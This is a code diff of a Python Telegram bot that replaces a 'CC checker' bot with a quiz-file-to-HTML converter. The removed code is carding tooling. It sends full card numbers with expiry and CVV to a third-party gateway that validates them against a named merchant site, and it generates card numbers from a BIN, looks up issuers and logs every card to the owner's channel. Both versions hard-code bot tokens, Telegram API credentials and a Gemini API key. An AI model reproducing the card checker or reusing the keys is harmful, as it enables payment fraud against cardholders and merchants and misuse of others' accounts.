@@ -1,375 +1,347 @@
-import logging
+import os
 import re
-import time
-import random
-import requests
-import asyncio
-from pyrogram import Client, filters, idle
+import json
+import io
+from pyrogram import Client, filters
 from pyrogram.types import Message
-from pyrogram.enums import ChatAction, ParseMode
+import random
+import time
+import asyncio
+import csv
 
-# === CONFIG ===
+# ── CONFIG ──
 API_ID = 22118129
 API_HASH = "43c66e3314921552d9330a4b05b18800"
-BOT_TOKEN = "7252664374:AAG-DTJZN5WUQRTZd7yLrDCEIlrYZJ6xxGw"
-GEMINI_API_KEY = "AIzaSyBcoZN2N2TKJeaWExZG9vT7hYU7K1--Tgw"
-BOT_OWNER = "@andr0idpie9"
-LOG_CHANNEL_ID = -1002843745742
-GATEWAY_NAME = "Stripe Auth"
-GATEWAY_URL_TEMPLATE = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={}"
-BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
-CC_REGEX = r"/chk (\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4})"
-OWNER_ID = 5203820046
+BOT_TOKEN = "7621851195:AAGG1W5UTBmlbTHi2Hx7_vgUjaK7_ecnXOM"
 
-# === Logging Setup ===
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
+TEMPLATE_HTML = "format2.html"  # must be in same dir
 
-# === Initialize Bot ===
-app = Client(
-    "CombinedBot",
-    api_id=API_ID,
-    api_hash=API_HASH,
-    bot_token=BOT_TOKEN
-)
+# State
+PENDING = {}  # chat_id -> {"questions": [], "step": str, "time": int, "negative": float}
 
-# === Ping Message ===
-PING_MESSAGE = """
-`⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
-⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
-⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
-⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
-⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
-⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
-⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉
+# ── Parsers ──
+def parse_format1(txt: str):
+    """Definition style, supports (a)(b)(c)... unlimited"""
+    questions = []
+    chunks = re.split(r'(?m)^\s*\d+\.\s*', txt)
+    chunks = [c.strip() for c in chunks if c.strip()]
+    for chunk in chunks:
+        m_def = re.split(r'\([a-zA-Z]\)', chunk, maxsplit=1)
+        if len(m_def) < 2:
+            continue
+        definition = m_def[0].strip()
+        opts = []
+        correct = -1
+        for match in re.finditer(r'\(([a-zA-Z])\)\s*(.*?)(?=(\([a-zA-Z]\)|Ex:|$))', chunk, flags=re.S):
+            raw = match.group(2).strip()
+            has_tick = '✅' in raw
+            raw = raw.replace('✅','').strip()
+            opts.append(raw)
+            if has_tick:
+                correct = len(opts)-1
+        m_ex = re.search(r'Ex\s*:\s*[“"]?(.*?)[”"]?\s*$', chunk, flags=re.S)
+        explanation = m_ex.group(1).strip() if m_ex else ""
+        questions.append({
+            "text": definition,
+            "options": opts,
+            "correctIndex": correct,
+            "explanation": explanation,
+            "reference": ""
+        })
+    return questions
 
-⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
-⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
-⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
-⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
-⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
-⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
-⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉` 
-"""
+def parse_format2(txt: str):
+    """Numbered + a) b) style"""
+    questions = []
+    blocks = re.split(r'(?m)^\d+\.\s*', txt)
+    for block in blocks:
+        if not block.strip(): continue
+        lines = [l.strip() for l in block.strip().splitlines() if l.strip()]
+        if not lines: continue
+        qtext = lines[0]
+        opts = []; correct = -1
+        for i,l in enumerate(lines[1:]):
+            has_tick = '✅' in l
+            l = l.replace('✅','').strip()
+            if l[:2].lower() in ["a)","b)","c)","d)","e)","f)"]:
+                l = l[2:].strip()
+            opts.append(l)
+            if has_tick: correct = len(opts)-1
+        questions.append({"text":qtext,"options":opts,"correctIndex":correct,"explanation":"","reference":""})
+    return questions
 
-# === Background Task for Ping ===
-async def ping_owner():
-    while True:
-        try:
-            await app.send_message(OWNER_ID, PING_MESSAGE)
-            logging.info("Ping message sent to owner")
-        except Exception as e:
-            logging.error(f"Failed to send ping: {e}")
-        await asyncio.sleep(300)  # 5 minutes = 300 seconds
-
-# === Gemini Flash API Function ===
-def get_gemini_flash_response(prompt: str) -> str:
-    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
-    headers = {
-        "Content-Type": "application/json",
-        "X-goog-api-key": GEMINI_API_KEY
-    }
-    payload = {
-        "contents": [
-            {
-                "parts": [{"text": prompt}]
-            }
-        ]
-    }
-
+def parse_format3(txt: str):
+    """Direct JSON quizData"""
     try:
-        response = requests.post(url, headers=headers, json=payload)
-        data = response.json()
-        return data["candidates"][0]["content"]["parts"][0]["text"]
-    except Exception as e:
-        logging.error(f"Gemini API Error: {e}")
-        return "⚠️SYSTEM PE LOAD HAI BHAI!"
+        m = re.search(r'const\s+quizData\s*=\s*({.*});', txt, flags=re.S)
+        if not m: return []
+        obj = json.loads(m.group(1))
+        return obj.get("questions",[])
+    except Exception:
+        return []
 
-# === Split long responses ===
-def split_response(text: str, max_len=4000):
-    parts = []
-    while len(text) > max_len:
-        split_at = text.rfind("\n", 0, max_len)
-        if split_at == -1:
-            split_at = max_len
-        parts.append(text[:split_at])
-        text = text[split_at:].lstrip()
-    parts.append(text)
-    return parts
+def parse_format4(txt: str):
+    """Q + options line by line, blank line separates questions"""
+    questions=[]
+    blocks = re.split(r'\n\s*\n', txt.strip())
+    for block in blocks:
+        lines=[l.strip() for l in block.splitlines() if l.strip()]
+        if not lines: continue
+        qtext=lines[0]
+        opts=[];correct=-1
+        for i,l in enumerate(lines[1:]):
+            has_tick='✅' in l
+            l=l.replace('✅','').strip()
+            opts.append(l)
+            if has_tick: correct=i
+        questions.append({"text":qtext,"options":opts,"correctIndex":correct,"explanation":"","reference":""})
+    return questions
 
-# === BIN Info Function ===
-def get_bin_info(bin_code):
-    try:
-        response = requests.get(BIN_API_URL.format(bin_code), timeout=10)
-        if response.status_code != 200:
-            return "Unknown", "Unknown", "N/A"
-
-        data = response.json()
-        brand = data.get("brand", "Unknown")
-        bank = data.get("bank", "Unknown")
-        country = data.get("country_name", "Unknown")
-        flag = data.get("country_flag", "")
-
-        return brand, bank, f"{country} {flag}" if country != "Unknown" else "N/A"
-
-    except Exception as e:
-        logging.error(f"BIN lookup error: {e}")
-        return "Unknown", "Unknown", "N/A"
-
-# === Generate CC Function ===
-def generate_cc(bin_code, count=10):
-    if count > 100:
-        count = 100
-    elif count < 1:
-        count = 1
-        
-    cc_list = []
-    for _ in range(count):
-        # Generate random card number (bin + 10 digits)
-        card_number = bin_code + ''.join([str(random.randint(0, 9)) for _ in range(10)])
-        
-        # Generate random expiry (month between 1-12, year between current year + 1 to +10)
-        month = str(random.randint(1, 12)).zfill(2)
-        year = str(random.randint(time.localtime().tm_year + 1, time.localtime().tm_year + 10))
-        
-        # Generate random 3-digit CVV
-        cvv = str(random.randint(100, 999))
-        
-        cc_list.append(f"<code>{card_number}|{month}|{year}|{cvv}</code>")
-    
-    return cc_list
-
-# === Log to Channel Function ===
-async def log_to_channel(client: Client, log_type: str, message: Message, content: str, result: str = None):
-    try:
-        user = message.from_user
-        user_info = f"[{user.first_name}](tg://user?id={user.id}) (`{user.id}`)"
-        chat_type = message.chat.type.name
-        
-        if log_type == "AI":
-            log_text = (
-                f"📝 **New AI Prompt** from {user_info}\n"
-                f"**Chat Type:** `{chat_type}`\n"
-                f"**Prompt:** `{content}`\n"
-                f"**AI Response:**\n{result}"
-            )
-        elif log_type == "CC":
-            log_text = (
-                f"💳 **New CC Check** from {user_info}\n"
-                f"**Chat Type:** `{chat_type}`\n"
-                f"**Card:** `{content}`\n"
-                f"**Result:** {result}"
-            )
-        elif log_type == "GEN":
-            log_text = (
-                f"🔄 **New CC Generation** from {user_info}\n"
-                f"**Chat Type:** `{chat_type}`\n"
-                f"**BIN:** `{content}`\n"
-                f"**Count:** {result}"
-            )
-        
-        await client.send_message(LOG_CHANNEL_ID, log_text)
-    except Exception as e:
-        logging.warning(f"Failed to log message: {e}")
-
-# === AI Handler ===
-@app.on_message(filters.text & filters.command("ai", prefixes="/"))
-async def ai_handler(client: Client, message: Message):
-    user_input = message.text[len("/ai"):].strip()
-    if not user_input:
-        await message.reply("❗ Please provide a prompt after `/ai`.")
-        return
-
-    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
-    thinking_msg = await message.reply("🧠 *Thinking...*", quote=True)
-
-    # Get AI response
-    ai_response = get_gemini_flash_response(user_input)
-    parts = split_response(ai_response)
-
-    # Send response
-    try:
-        if len(parts) == 1:
-            final_text = f"{parts[0]}\n\n✨ Powered by {BOT_OWNER}"
-            await thinking_msg.edit(final_text)
-        else:
-            await thinking_msg.edit(parts[0])
-            for part in parts[1:-1]:
-                await message.reply(part)
-            await message.reply(f"{parts[-1]}\n\n✨ Powered by {BOT_OWNER}")
-    except Exception as e:
-        logging.error(f"Edit/send failed: {e}")
-        await message.reply("⚠️ Failed to send AI response.")
-
-    # Log to channel
-    await log_to_channel(client, "AI", message, user_input, ai_response)
-
-# === CC Check Handler ===
-@app.on_message(filters.text & filters.regex(CC_REGEX))
-async def check_card(client: Client, message: Message):
-    match = re.search(CC_REGEX, message.text)
-    if not match:
-        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
-        return
-
-    card = match.group(1)
-    bin_code = card[:6]
-
-    # Send initial "processing" message
-    proc_msg = await message.reply_text(
-        f"↯ Checking..\n\n"
-        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
-        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>{GATEWAY_NAME}</code>\n"
-        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
-    )
-
-    start_time = time.time()
-
-    try:
-        response = requests.get(GATEWAY_URL_TEMPLATE.format(card), timeout=60)
-        elapsed = round(time.time() - start_time, 2)
-        result_json = response.json()
-        result_text = response.text.strip()
-
-        if "declined" in result_text.lower():
-            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-        else:
-            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
-
-    except Exception as e:
-        await proc_msg.edit(f"❌ Error: {e}")
-        return
-
-    brand, bank, country = get_bin_info(bin_code)
-
-    final_msg = (
-        f"┏━━━━━━━⍟\n"
-        f"┃ {status}\n"
-        f"┗━━━━━━━━━━━⊛\n\n"
-        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
-        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>{GATEWAY_NAME}</code>\n"
-        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{result_text}</code>\n\n"
-        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
-        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
-        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
-        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
-        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
-        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
-    )
-
-    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
-    
-    # Log to channel
-    await log_to_channel(client, "CC", message, card, status)
-
-# === CC Generator Handler ===
-@app.on_message(filters.command("gen", prefixes="/"))
-async def generate_cc_handler(client: Client, message: Message):
-    try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            await message.reply("❗ Please provide a BIN after <code>/gen</code>\nExample: <code>/gen 511253</code> or <code>/gen 511253 5</code>", parse_mode=ParseMode.HTML)
-            return
-
-        bin_code = parts[1]
-        if not bin_code.isdigit() or len(bin_code) < 6:
-            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
-            return
-
-        # Get count if provided
-        count = 10  # default
-        if len(parts) > 2:
+def parse_csv(path: str):
+    """CSV format parser (no pandas)"""
+    questions = []
+    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+        reader = csv.DictReader(f)
+        for row in reader:
+            opts = []
+            for i in range(1, 11):  # support up to 10 options
+                val = row.get(f"Option {i}", "")
+                if val and val.strip():
+                    opts.append(val.strip())
             try:
-                count = int(parts[2])
-                if count > 1000:
-                    count = 50
-                    await message.reply("⚠️ Maximum count is 50. Generating 50 CCs.")
-                elif count < 1:
-                    count = 1
-            except ValueError:
-                await message.reply("❗ Invalid count. Using default 10 CCs.")
+                correct_idx = int(row.get("Correct Index", 0)) - 1
+            except:
+                correct_idx = 0
+            if correct_idx < 0 or correct_idx >= len(opts):
+                correct_idx = 0
+            questions.append({
+                "text": row.get("Question (Exam Info)", "").strip(),
+                "options": opts,
+                "correctIndex": correct_idx,
+                "explanation": row.get("Explanation", "").strip(),
+                "reference": ""
+            })
+    return questions
 
-        # Show generating message
-        proc_msg = await message.reply(f"🔹 Generating {count} CCs...")
+def detect_and_parse(txt:str):
+    if "Definition:" in txt or re.search(r'\([a-zA-Z]\)', txt):
+        return parse_format1(txt)
+    if re.search(r'^\s*\d+\.\s+.*\na\)', txt, flags=re.M):
+        return parse_format2(txt)
+    if "const quizData" in txt:
+        return parse_format3(txt)
+    if re.search(r'✅', txt) and not ("(a)" in txt):
+        return parse_format4(txt)
+    return []
 
-        # Generate CCs
-        cc_list = generate_cc(bin_code[:6], count)
+# ── HTML Injector ──
+def replace_questions_in_template(html: str, questions, minutes:int, negative:float):
+    start_qd = html.find("const quizData")
+    if start_qd == -1: raise ValueError("quizData not found")
+    tail = html[start_qd:]
+    start_q = tail.find("questions"); start_q+=start_qd
+    m_open = re.search(r'questions\s*:\s*\[', html[start_q:], flags=re.S)
+    if not m_open: raise ValueError("questions array not found")
+    q_arr_open = start_q + m_open.start()
+    i = q_arr_open + m_open.group(0).rfind('[')+1
+    depth=1
+    while i < len(html):
+        if html[i]=='[': depth+=1
+        elif html[i]==']': depth-=1
+        if depth==0: break
+        i+=1
+    q_arr_end=i
+    questions_js = json.dumps(questions, ensure_ascii=False, indent=2)
+    new_block = f"settings: {{ totalTimeSec: {minutes*60}, negativeMarkPerWrong: {negative} }},\n  questions: {questions_js}"
+    before = html[:q_arr_open-1]
+    after = html[q_arr_end+1:]
+    return before+new_block+after
 
-        # Get BIN info
-        brand, bank, country = get_bin_info(bin_code[:6])
+# ── Bot ──
+app = Client("quiz_html_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-        # Format response
-        cc_text = "\n".join(cc_list)
-        response_text = (
-            f"<b>Generated {count} CCs 💳</b>\n\n"
-            f"{cc_text}\n\n"
-            f"<b>BIN-LOOKUP</b>\n"
-            f"• BIN ➳ <code>{bin_code[:6]}</code>\n"
-            f"• Country ➳ {country}\n"
-            f"• Type ➳ {brand}\n"
-            f"• Bank ➳ {bank}\n\n"
-            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
-            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
-        )
+@app.on_message(filters.command(["start","help"]))
+async def start_handler(_, msg: Message):
+    await msg.reply_text(
+        "👋 Send me a .txt or .csv file.\n"
+        "Supported formats: (1–4) text or CSV.\n"
+        "I’ll parse the questions, then ask:\n"
+        "1️⃣ Test time in minutes\n2️⃣ Negative mark per wrong\n3️⃣ Shuffle? (yes/no)\n4️⃣ Filename\n\n"
+        "Then I’ll send you the final .html."
+    )
 
-        await proc_msg.edit(response_text, parse_mode=ParseMode.HTML)
-        
-        # Log to channel
-        await log_to_channel(client, "GEN", message, bin_code[:6], count)
+@app.on_message(filters.document & (filters.private | filters.group))
+async def file_handler(_, msg: Message):
+    filename = msg.document.file_name.lower()
+    path = await msg.download()
 
+    if filename.endswith(".txt"):
+        txt = open(path,"r",encoding="utf-8",errors="ignore").read()
+        os.remove(path)
+        questions = detect_and_parse(txt)
+
+    elif filename.endswith(".csv"):
+        questions = parse_csv(path)
+        os.remove(path)
+
+    else:
+        return
+
+    if not questions:
+        await msg.reply_text("❌ Could not parse. Check file format.")
+        return
+    PENDING[msg.chat.id]={"questions":questions,"step":"time"}
+    await msg.reply_text(f"✅ Parsed {len(questions)} questions.\nNow send test time in minutes:")
+
+@app.on_message(filters.text & (filters.private | filters.group))
+async def text_handler(_, msg: Message):
+    if msg.chat.id not in PENDING: return
+    state=PENDING[msg.chat.id]
+    if state["step"]=="time":
+        try:
+            mins=int(msg.text.strip());
+            state["time"]=mins; state["step"]="negative"
+            await msg.reply_text("⏬ Now send negative marks per wrong (e.g. 0.25):")
+        except: await msg.reply_text("❌ Send a valid integer (minutes).")
+    elif state["step"]=="negative":
+        try:
+            neg=float(msg.text.strip())
+            state["negative"]=neg; state["step"]="shuffle"
+            await msg.reply_text("🔀 Do you want to shuffle questions and options? (yes/no):")
+        except: await msg.reply_text("❌ Send a valid number (e.g. 0.25).")
+    elif state["step"]=="shuffle":
+        ans = msg.text.strip().lower()
+        if ans not in ["yes", "no"]:
+            await msg.reply_text("❌ Send yes or no.")
+            return
+        if ans == "no":
+            state["step"]="filename"
+            await msg.reply_text("📄 Finally send filename (without .html):")
+            return
+        progress_msg = await msg.reply_text("🔀 Starting shuffle... 0%")
+        questions = state["questions"]
+        random.shuffle(questions)
+        num_q = len(questions)
+        temp_file = f"temp_shuffled_{msg.chat.id}.txt"
+        with open(temp_file, "w", encoding="utf-8") as f:
+            pass
+        last_update = time.time()
+        for i, q in enumerate(questions):
+            opts = q["options"]
+            if len(opts) > 1:
+                correct_opt = opts[q["correctIndex"]]
+                random.shuffle(opts)
+                q["correctIndex"] = opts.index(correct_opt)
+            with open(temp_file, "a", encoding="utf-8") as f:
+                f.write(f"{i+1}. {q['text']}\n")
+                for j, opt in enumerate(opts):
+                    mark = "✅" if j == q["correctIndex"] else ""
+                    f.write(f"({chr(97+j)}) {opt}{mark} ")
+                if q["explanation"]:
+                    f.write(f"\nEx: {q['explanation']}")
+                f.write("\n\n")
+            progress = int((i + 1) / num_q * 100)
+            current_time = time.time()
+            if current_time - last_update >= 3:
+                await progress_msg.edit_text(f"🔀 Shuffling... {progress}%")
+                last_update = current_time
+            await asyncio.sleep(0.5)
+        await progress_msg.edit_text("🔀 Shuffle complete! 100%")
+        with open(temp_file, "r", encoding="utf-8") as f:
+            shuffled_txt = f.read()
+        os.remove(temp_file)
+        state["questions"] = detect_and_parse(shuffled_txt)
+        state["step"]="filename"
+        await msg.reply_text("📄 Finally send filename (without .html):")
+    elif state["step"]=="filename":
+        name=re.sub(r'[^A-Za-z0-9_\- ]+','',msg.text.strip())
+        if not name:
+            await msg.reply_text("❌ Invalid filename.")
+            return
+        out_name=f"{name}.html"
+        with open(TEMPLATE_HTML,"r",encoding="utf-8",errors="ignore") as f: html=f.read()
+        data=replace_questions_in_template(html,state["questions"],state["time"],state["negative"]).encode("utf-8")
+        file_obj=io.BytesIO(data); file_obj.name=out_name
+        await msg.reply_document(file_obj,caption=f"✅ Here is your quiz: {out_name}")
+        PENDING.pop(msg.chat.id,None)
+
+# ===============================
+# /txt2quiz handler (unchanged)
+# ===============================
+@app.on_message(filters.command("txt2quiz", prefixes="/"))
+async def txt2quiz_handler(client: Client, message: Message):
+    try:
+        text_block = ""
+        if "\n" in message.text.strip():
+            parts = message.text.split("\n", 1)
+            text_block = parts[1].strip()
+        elif message.reply_to_message and message.reply_to_message.document:
+            file_path = await message.reply_to_message.download()
+            with open(file_path, "r", encoding="utf-8") as f:
+                text_block = f.read()
+            os.remove(file_path)
+        else:
+            await message.reply_text(
+                "📌 Usage:\n"
+                "1. `/txt2quiz` + quiz text in message\n"
+                "2. Reply `/txt2quiz` to a `.txt` file"
+            )
+            return
+        if not text_block:
+            await message.reply_text("❌ No quiz text found.")
+            return
+        questions = []
+        current_q = None
+        for line in text_block.splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            if line[0].isdigit() and "." in line[:4]:
+                if current_q:
+                    questions.append(current_q)
+                current_q = {
+                    "text": line.split(".", 1)[1].strip(),
+                    "options": [],
+                    "correct": None,
+                    "explanation": ""
+                }
+            elif line.startswith("(") and ")" in line[:4] and current_q:
+                option_text = line[3:].strip()
+                is_correct = "✅" in option_text
+                option_text = option_text.replace("✅", "").strip()
+                current_q["options"].append(option_text)
+                if is_correct:
+                    current_q["correct"] = len(current_q["options"]) - 1
+            elif line.lower().startswith("ex:") and current_q:
+                current_q["explanation"] = line[3:].strip()
+        if current_q:
+            questions.append(current_q)
+        if not questions:
+            await message.reply_text("❌ Could not parse any valid questions.")
+            return
+        sent_count = 0
+        for q in questions:
+            if len(q["options"]) < 2:
+                continue
+            correct_idx = q["correct"] if q["correct"] is not None else 0
+            try:
+                await client.send_poll(
+                    chat_id=message.chat.id,
+                    question=q["text"][:295],
+                    options=q["options"][:10],
+                    type="quiz",
+                    correct_option_id=correct_idx,
+                    explanation=q["explanation"] or None,
+                    is_anonymous=False,
+                )
+                sent_count += 1
+                await asyncio.sleep(2)
+            except Exception as e:
+                await message.reply_text(f"⚠️ Error: {e}")
+        await message.reply_text(f"✅ Created {sent_count} quiz polls.")
     except Exception as e:
-        logging.error(f"CC generation error: {e}")
-        await message.reply(f"❌ Error generating CCs: {str(e)}")
+        await message.reply_text(f"❌ Error: {e}")
 
-# === Start Handler ===
-@app.on_message(filters.command("start") & filters.private)
-async def start_handler(client: Client, message: Message):
-    welcome_msg = f"""
-🌟 **Welcome to {GATEWAY_NAME} Bot** 🌟
-
-⚡ **A Multi-Purpose Bot with Powerful Features:**
-
-✓ **AI Assistant** - Get smart responses with `/ai <your query>`
-✓ **CC Checker** - Validate cards with `/chk <card details>`
-✓ **CC Generator** - Generate test cards with `/gen <BIN>`
-
-🔹 **Example Commands:**
-- `/ai explain quantum computing`
-- `/chk 4111111111111111|12|2025|123`
-- `/gen 511253 5` (generates 5 cards with BIN 511253)
-
-📌 **Bot Features:**
-- Fast and reliable
-- Secure processing
-- Detailed responses
-
-👨‍💻 **Developer:** {BOT_OWNER}
-🛠 **Support:** Contact dev for issues
-
-🔥 **Start exploring by sending a command above!** 🔥
-"""
-    await message.reply(welcome_msg, parse_mode=ParseMode.MARKDOWN)
-
-# === Startup Task ===
-async def startup_task():
-    # Start the ping task when bot starts
-    asyncio.create_task(ping_owner())
-
-# === Main Function ===
-async def main():
-    await app.start()
-    await startup_task()
-    await idle()
-
-if __name__ == "__main__":
-    print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(main())
+if __name__=="__main__":
+    print("Bot running. Press Ctrl+C to stop.")
+    app.run()
